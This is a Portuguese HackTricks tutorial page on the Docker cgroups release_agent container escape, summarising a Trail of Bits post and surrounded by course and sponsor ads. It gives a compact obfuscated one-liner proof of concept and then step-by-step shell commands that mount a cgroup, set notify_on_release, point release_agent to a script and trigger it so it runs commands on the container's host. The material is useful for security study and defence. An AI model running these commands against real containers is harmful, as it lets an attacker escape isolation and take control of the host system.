# Fuga de cgroups do Docker release_agent

{% hint style="success" %}
Aprenda e pratique Hacking na AWS: <img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**Treinamento HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Aprenda e pratique Hacking no GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**Treinamento HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Apoie o HackTricks</summary>

* Verifique os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** 💬 [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para os repositórios** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}

### [WhiteIntel](https://whiteintel.io)

<figure><img src="../../../../.gitbook/assets/image (1227).png" alt=""><figcaption></figcaption></figure>

[**WhiteIntel**](https://whiteintel.io) é um mecanismo de busca alimentado pela **dark web** que oferece funcionalidades **gratuitas** para verificar se uma empresa ou seus clientes foram **comprometidos** por **malwares ladrões**.

O principal objetivo do WhiteIntel é combater tomadas de conta e ataques de ransomware resultantes de malwares que roubam informações.

Você pode verificar o site deles e experimentar o mecanismo de busca deles de forma **gratuita** em:

{% embed url="https://whiteintel.io" %}

***

**Para mais detalhes, consulte o** [**post original do blog**](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)**.** Este é apenas um resumo:

PoC Original:
```shell
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
mkdir -p $d/w;echo 1 >$d/w/notify_on_release
t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
touch /o; echo $t/c >$d/release_agent;echo "#!/bin/sh
$1 >$t/o" >/c;chmod +x /c;sh -c "echo 0 >$d/w/cgroup.procs";sleep 1;cat /o
```
O teste de conceito (PoC) demonstra um método para explorar cgroups criando um arquivo `release_agent` e acionando sua invocação para executar comandos arbitrários no host do contêiner. Aqui está uma quebra das etapas envolvidas:

1. **Preparar o Ambiente:**
   * Um diretório `/tmp/cgrp` é criado para servir como ponto de montagem para o cgroup.
   * O controlador cgroup RDMA é montado neste diretório. Em caso de ausência do controlador RDMA, é sugerido usar o controlador cgroup `memory` como alternativa.
```shell
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
```
2. **Configurar o Cgroup Filho:**
* Um cgroup filho chamado "x" é criado dentro do diretório cgroup montado.
* As notificações são habilitadas para o cgroup "x" escrevendo 1 em seu arquivo notify\_on\_release.
```shell
echo 1 > /tmp/cgrp/x/notify_on_release
```
3. **Configurar o Agente de Liberação:**
* O caminho do contêiner no host é obtido a partir do arquivo /etc/mtab.
* O arquivo release\_agent do cgroup é então configurado para executar um script chamado /cmd localizado no caminho do host adquirido.
```shell
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent
```
4. **Criar e Configurar o Script /cmd:**
* O script /cmd é criado dentro do contêiner e é configurado para executar ps aux, redirecionando a saída para um arquivo chamado /output no contêiner. O caminho completo de /output no host é especificado.
```shell
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
```
5. **Desencadear o Ataque:**
* Um processo é iniciado dentro do cgroup filho "x" e é imediatamente terminado.
* Isso aciona o `release_agent` (o script /cmd), que executa ps aux no host e escreve a saída em /output dentro do contêiner.
```shell
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```
### [WhiteIntel](https://whiteintel.io)

<figure><img src="../../../../.gitbook/assets/image (1227).png" alt=""><figcaption></figcaption></figure>

[**WhiteIntel**](https://whiteintel.io) é um mecanismo de busca alimentado pela **dark web** que oferece funcionalidades **gratuitas** para verificar se uma empresa ou seus clientes foram **comprometidos** por **malwares ladrões**.

O principal objetivo do WhiteIntel é combater tomadas de conta e ataques de ransomware resultantes de malwares que roubam informações.

Você pode acessar o site deles e experimentar o mecanismo gratuitamente em:

{% embed url="https://whiteintel.io" %}

{% hint style="success" %}
Aprenda e pratique Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**Treinamento HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Aprenda e pratique Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**Treinamento HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Suporte ao HackTricks</summary>

* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** 💬 [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para os repositórios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}
